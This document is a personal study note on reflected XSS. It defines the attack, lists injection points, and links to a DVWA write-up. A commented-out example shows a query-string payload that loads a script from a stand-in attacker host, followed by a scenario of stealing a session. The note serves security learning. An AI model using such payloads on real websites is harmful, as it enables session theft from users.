title: Reflected XSS
---

**Reflected XSS** is the type of [[knowledge/off-sec/pentesting/xss|XSS]] attack where the **payload included in HTTP request** **is included in the webpage source without validation**.

Since it's a reflected XSS, the harmful code isn't saved in the remote web app. To execute the code on the target's host, some [[social engineering]] is needed (e.g. sending a faulty link via email).

## Possible points of entry

- URL Query Params
- URL file path
- HTTP headers (although unlikely exploitable in practice)

Once you find the entry point and the way to reflect data in the webpage source, you need to confirm that you can successfully run a JS/PHP code through the payload (code might or might not work depending on where the payload is reflected).

## My Write-ups

- [[knowledge/off-sec/write-ups/dvwa/dvwa-xss-reflected-low]]

<!-- 
## Example

A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the `error` parameter in the query string.

```
https://website.thm/?error=Invalid input Detected
```

If the application doesn't check the contents of the error parameters, we could insert malicious code:

```
https://website.thm/?error=<script src="https://attacker.thm/evil.js'></script>
```

This would get rendered as

```html
<div class-"alert alert-danger">
	<p>
		<script src="https://attacker.thm/evil.js"></script>
	</p>
</div>
```

## Example scenario

1. Attacker sends a link with malicious [payload](knowledge/off-sec/glossary/payload.md) to a victim
2. Victim clicks the link and is taken to a vulnerable site
3. Link containing attacker's script is executed on website
4. The gathered data (e.g. stolen session) is sent back to the attacker

The attacker could send links or embed them into an `iframe` to execute code on the victim browser, potentially revealing sensitive information.
